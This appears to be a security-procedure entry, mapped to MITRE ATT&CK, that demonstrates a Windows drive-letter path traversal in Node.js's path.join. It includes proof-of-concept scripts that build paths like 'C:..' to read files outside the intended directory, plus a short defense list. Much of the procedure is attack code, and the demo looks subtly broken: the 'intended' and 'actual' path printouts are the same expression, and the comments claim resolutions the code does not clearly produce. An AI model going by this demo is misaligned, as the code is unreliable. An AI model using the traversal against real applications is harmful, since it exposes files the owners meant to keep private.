---
id: proc-nodejs-pathtraversal-demo
name: Demonstrate Node.js Path Traversal on Windows
tags:
  - path-traversal
  - nodejs
  - windows
  - discovery
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.048Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Demonstrate Node.js Path Traversal on Windows

## Summary

This procedure demonstrates a path traversal vulnerability in Node.js on Windows systems, where the path.join function fails to properly handle drive letters (e.g., 'C:'), treating paths as relative but resolving them to the root directory, enabling unauthorized file system access.

## Description

In Node.js applications running on Windows, the path module's join function does not recognize drive letters as absolute path indicators. Instead, a path like 'C:filename' is treated as relative to the current directory, but due to Windows path resolution quirks, it can lead to traversal to the root directory (C:\). This was reported by researcher taise on January 8, 2024, via HackerOne (Report #2307225), classified as CVE-2025-23084 with medium severity (CVSS 5.6). Attackers can exploit this in Node.js-based servers or scripts to read files outside intended directories, such as system files in the root, if the application processes user-supplied paths.

The target environment is Windows with Node.js versions affected prior to the patch. Prerequisites include local execution privileges on a Windows machine with Node.js installed. Expected outcomes include successful resolution of paths to the root directory and reading of arbitrary files there.

## Requirements

1. Windows operating system
2. Node.js installed (affected versions)
3. Local execution access to run Node.js scripts
4. Basic knowledge of JavaScript and file system operations

## Defense

Defensive measures and detection strategies:

- Update Node.js to patched versions that properly handle Windows drive letters in path resolution
- Validate and sanitize all user-supplied paths using absolute path enforcement or whitelisting
- Implement file access logging and monitor for anomalous path resolutions (e.g., unexpected root access)
- Use containerization or sandboxing to limit file system access in Node.js applications

## Objectives

1. Demonstrate path resolution to root directory using drive letter prefix
2. Read a file from the root directory to confirm traversal
3. Highlight risks in Node.js applications processing paths on Windows

## Instructions

### Step 1: Create Vulnerable Node.js Script

**Context**: Write a JavaScript file that uses path.join with a drive letter to construct a path, simulating a vulnerable application handling user input.

Create a file named demo-traversal.js with the following content:

```javascript
const path = require('path');
const fs = require('fs');

// Simulate user input with drive letter
let userPath = 'C:secret.txt'; // This will resolve relative but to root
let fullPath = path.join(process.cwd(), userPath); // Vulnerable join

console.log('Intended path:', path.join(process.cwd(), userPath));
console.log('Actual resolved path:', fullPath);

// Attempt to read a root file, e.g., if secret.txt exists in root
try {
  let content = fs.readFileSync(fullPath, 'utf8');
  console.log('Accessed content:', content);
} catch (err) {
  console.log('Access error (expected if file missing):', err.message);
  // To test traversal, try reading a known root file like 'C:\autoexec.bat' if exists
  let rootTest = path.join('C:..', 'autoexec.bat');
  let rootContent = fs.readFileSync(rootTest, 'utf8');
  console.log('Root file content:', rootContent);
}
```

This script shows how 'C:secret.txt' resolves to the root instead of current dir.

### Step 2: Execute the Script

**Context**: Run the Node.js script to observe the path traversal in action.

Execute the script using Node.js:

```bash
node demo-traversal.js
```

> The command runs the JavaScript file, outputting the resolved paths and any file contents accessed from the root directory. If a file like autoexec.bat exists in root, it will be read successfully, confirming traversal.

### Step 3: Validate Traversal

**Context**: Confirm the vulnerability by checking if paths without leading separators resolve to root.

Modify the script to test multiple paths and re-run:

```javascript
let testPaths = ['C:..', 'C:filename', 'D:..'];
testPaths.forEach(p => {
  let resolved = path.join(process.cwd(), p);
  console.log(`Path ${p} resolves to: ${resolved}`);
});
```

Run again with `node demo-traversal.js`. Expected output shows resolutions to C:\ or similar root paths.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- path-traversal
- nodejs
- windows
